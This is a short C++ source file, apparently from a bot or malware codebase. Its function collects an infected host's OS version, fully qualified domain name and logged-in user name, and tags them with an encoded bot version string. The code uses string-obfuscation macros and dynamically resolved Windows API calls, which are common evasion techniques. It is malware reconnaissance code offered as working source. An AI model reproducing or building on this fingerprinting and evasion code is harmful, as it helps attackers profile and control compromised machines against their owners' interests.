#include "info.h"
#include "main.h"
#include "core\version.h"

void GetEnvironmentComment( StringBuilder& s )
{
	StringBuilderStack<256> buf;
	GetNTVersion(buf);
	s = _CS_("OS: ");
	s += buf;
	s += _CS_(", Domain: ");
	DWORD size = buf.Size();
	if( API(KERNEL32, GetComputerNameExA)( ComputerNameDnsFullyQualified, buf.c_str(), &size ) )
	{
		buf.SetLen(size);
		s += buf;
	}
	s += _CS_(", User: ");
	size = buf.Size();
	if( API(ADVAPI32, GetUserNameA)( buf.c_str(), &size ) )
	{
		buf.SetLen(size - 1);
		s += buf;
	}
	s += _CS_(", Ver: ");
	s += DECODE_STRING(Config::BotVersion);
}

int GetEnvironmentComment( char* s, int sz_s )
{
	StringBuilder s2( s, sz_s );
	GetEnvironmentComment(s2);
	return s2.Len();
}
